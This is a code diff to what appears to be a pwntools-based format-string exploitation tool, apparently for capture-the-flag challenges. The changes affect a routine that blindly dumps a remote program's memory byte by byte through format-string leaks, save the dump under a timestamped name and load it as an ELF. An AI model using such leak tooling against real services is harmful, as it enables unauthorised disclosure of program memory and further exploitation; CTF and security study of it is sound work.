@@ -47,6 +47,9 @@ class ffstr():
 		self.re_FlagPattern  	= b"[a-zA-Z0-9]+\{\S+\}"
 		self.re_ArgPattern	= b"%[0-9]+\$[a-zA-Z]{0,2}"
 		
+		# Dump binary
+		self.dump_name = None
+		
 		
 	def getArgs(self):
 		# Get args from pwntools
@@ -362,7 +365,8 @@ class ffstr():
 
 					
 				# Close connexion
-				self.close()
+				if not all(self.blind_behavior):
+					self.close()
 			
 			
 		
@@ -379,7 +383,7 @@ class ffstr():
 		
 		# Byte per Byte
 		n = 0
-		while n < 0x38f4:
+		while n < 16*10:
 			
 			
 			# Get location
@@ -407,9 +411,6 @@ class ffstr():
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 				data = self.asyncExchange(pl)
 
-			print(p64(leak-offset+n))
-			print(pl.hex())
-			print(data)
 			left = data.find(b"d34d")+len(b"d34d")
 			right= data.find(b"b33f")
 			
@@ -426,19 +427,19 @@ class ffstr():
 					
 				print(dump)
 				print(hexdump(binary))
-			
-			if pl.find(b"\n")>-1:
-				input()
 				
 			# Close connexion
-			self.close()
+			if not all(self.blind_behavior):
+				self.close()
 
-		with open("./binary","wb") as fp:
+		# unique name for the dump binary
+		self.dump_name = str(int(time()))
+		with open(self.dump_name,"wb") as fp:
 			fp.write(binary)
 			
 	def loadELF(self):
-		# Load ELF as per pwntools methodology
-		self.elf  = ELF(args["BINARY"])
+		# Load ELF as per pwntools methodology from dumped binary
+		self.elf  = ELF(self.dump_name)
 		
 if __name__ == "__main__":
 
